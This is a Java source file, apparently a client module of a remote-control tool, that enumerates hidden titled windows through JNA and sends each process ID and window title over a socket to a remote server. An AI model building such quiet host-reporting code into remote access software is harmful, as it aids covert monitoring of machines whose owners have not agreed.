package me.client.send;

import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.ptr.IntByReference;
import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;

import java.net.Socket;

public class EnumWindows {
    Socket socket;
    public EnumWindows(Socket socket) {
        this.socket = socket;
    }
    public void enumWindows() {
        IntByReference intByReference = new IntByReference();
        Pointer pointer = Pointer.createConstant(0);
        User32.INSTANCE.EnumWindows((hWnd, p) -> {
            int length = User32.INSTANCE.GetWindowTextLength(hWnd);
            if (length == 0 || User32.INSTANCE.IsWindowVisible(hWnd)) {
            } else {
                char[] lpString = new char[260];
                User32.INSTANCE.GetWindowText(hWnd, lpString, 260);
                String str = User32.INSTANCE.GetWindowThreadProcessId(hWnd,intByReference) +"|" + String.valueOf(lpString);
                SendMessage.Send(MessageFlags.ENUM_WINDOWS,str.getBytes(),socket);
            }
            return true;
        }, pointer);
    }
}
